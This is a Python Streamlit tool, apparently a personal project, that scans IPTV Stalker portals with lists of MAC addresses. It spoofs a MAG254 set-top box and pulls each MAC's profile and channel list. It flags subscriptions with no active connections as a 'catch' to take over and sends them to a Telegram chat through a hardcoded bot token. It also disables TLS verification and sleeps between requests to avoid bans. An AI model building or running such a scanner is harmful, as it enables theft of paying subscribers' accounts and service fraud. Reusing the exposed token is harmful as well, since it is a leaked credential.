import streamlit as st
import requests
import time
import telebot
import re
import urllib3

# إعدادات الأمان والتجاهل
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# بياناتك (تأكد من صحتها)
TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
ID = 7638628794
bot = telebot.TeleBot(TOKEN)

# الباقات المطلوبة
FAV_CHANNELS = ["AFRICA", "2025", "8K", "4K", "IARI"]

st.set_page_config(page_title="Radar Ayoub", layout="wide")
st.title("📡 Radar Ayoub Hammami Pro")

raw_input = st.text_area("ضع الرابط والماكات هنا:")

if st.button("🚀 بدء المسح"):
    # استخراج الماكات والروابط
    macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', raw_input.upper())))
    host = re.search(r'(https?://[^\s]+)', raw_input)
    
    if host and macs:
        url = host.group(0).split('/portal.php')[0].rstrip('/') + "/portal.php"
        st.success(f"🌐 جاري الفحص المباشر: {url}")
        
        results = []
        for mac in macs:
            headers = {
                'User-Agent': 'Mozilla/5.0 (MAG254) stbapp',
                'X-User-Agent': 'Model: MAG254; Link: WiFi',
                'Cookie': f'mac={mac}',
                'Referer': 'http://mag.infomir.com/'
            }
            try:
                # محاولة جلب البروفايل مباشرة بمهلة 15 ثانية
                res = requests.get(f"{url}?type=stb&action=get_profile&force_stb=1", 
                                   headers=headers, timeout=15, verify=False)
                
                if res.status_code == 200 and '"active_cons"' in res.text:
                    active = re.search(r'"active_cons"\s*:\s*"(\d+)"', res.text).group(1)
                    expiry = re.search(r'"end_date"\s*:\s*"([^"]+)"', res.text).group(1) if "end_date" in res.text else "N/A"
                    
                    # فحص القنوات سريعا
                    res_ch = requests.get(f"{url}?type=itv&action=get_all_channels", headers=headers, timeout=15, verify=False)
                    found = "نعم ✅" if any(k in res_ch.text.upper() for k in FAV_CHANNELS) else "لا ❌"

                    results.append({"MAC": mac, "حالة": "شغال 🟢", "متصل": active, "انتهاء": expiry, "باقات": found})
                    
                    # إرسال تلغرام فوري للصيد المتاح
                    if active == "0":
                        bot.send_message(ID, f"🎯 صيد متاح!\n🖥️ {mac}\n📅 ينتهي: {expiry}\n📺 باقاتك: {found}\n👤 المالك: Ayoub Hammami")
                else:
                    results.append({"MAC": mac, "حالة": "معطل 🔴", "متصل": "-", "انتهاء": "-", "باقات": "-"})
            except:
                results.append({"MAC": mac, "حالة": "خطأ اتصال 🔴", "متصل": "-", "انتهاء": "-", "باقات": "-"})
            
            time.sleep(1.2) # تأخير لتجنب الحظر
        
        st.table(results)
    else:
        st.error("تأكد من وضع الرابط والماكات بشكل صحيح.")
